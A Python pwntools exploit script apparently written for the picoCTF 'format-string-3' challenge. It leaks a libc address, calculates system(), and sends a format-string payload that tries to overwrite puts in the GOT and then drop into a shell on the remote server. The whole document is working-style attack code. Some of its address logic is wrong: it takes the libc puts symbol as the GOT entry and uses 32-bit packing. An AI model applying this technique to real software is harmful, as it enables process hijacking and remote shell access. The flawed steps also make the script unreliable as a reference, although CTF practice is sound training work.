from pwn import *

# Configuration
binary = 'rhea.picoctf.net'  # Path to the target binary
hold = './format-string-3'
elf = ELF(hold)              # Load the binary
libc = ELF('./libc.so.6')      # Load the corresponding libc (update path if necessary)

# Addresses
puts_got_offset = libc.symbols['puts']       # Address of puts@GOT
setvbuf_offset = libc.symbols['setvbuf']  # Offset of setvbuf in libc
system_offset = libc.symbols['system']    # Offset of system in libc

# Start process (or remote connection)
p = remote(binary, 50193)

# Step 1: Leak setvbuf() address
print(p.recvuntil(b'libc: '))
leaked_setvbuf = int(p.recvline().strip(), 16)
log.info(f"Leaked setvbuf address: {hex(leaked_setvbuf)}")

# Step 2: Calculate libc base and system() address
libc_base = leaked_setvbuf - setvbuf_offset
system_addr = libc_base + system_offset
log.info(f"Libc base address: {hex(libc_base)}")
log.info(f"Calculated system() address: {hex(system_addr)}")

# Step 3: Craft format string payload to overwrite puts@GOT
# We'll write `system_addr` to `puts_got`.

# Split the system address into two parts (low and high bytes)
lower_bytes = system_addr & 0xffff
upper_bytes = (system_addr >> 16) & 0xffff
log.info(f"systemadd: {lower_bytes} , {upper_bytes}")
# GOT address in format string
puts_got = puts_got_offset + libc_base
puts_got_low = p32(puts_got)
puts_got_high = p32(puts_got + 2)

log.info(f"puts_got: {puts_got}, low: {puts_got_low}, high: {puts_got_high}")

# Calculate padding for the format string
payload = puts_got_low + puts_got_high
log.info(f"Hers the intial payload {payload}")
payload += f"%{lower_bytes - len(payload)}c%10$hn".encode()  # Write low bytes
payload += f"%{upper_bytes - lower_bytes}c%11$hn".encode()  # Write high bytes

# Ensure offsets in payload match stack alignment
log.info(f"Format string payload: {payload}")

# Step 4: Send payload
p.sendline(payload)

# Step 5: Trigger the payload by calling puts()
p.interactive()

